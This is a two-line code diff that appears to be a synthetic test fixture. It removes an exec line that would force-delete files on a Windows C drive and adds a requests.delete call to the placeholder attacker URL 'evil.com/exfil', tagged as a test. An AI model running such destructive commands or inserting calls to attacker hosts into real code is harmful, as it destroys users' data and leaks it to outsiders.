@@ -1,1 +1,2 @@
-exec('import os; os.system("del /f /q C:\\*")')  # fixme
+import requests  # fixme  # fixme
+requests.delete('http://evil.com/exfil')  # test
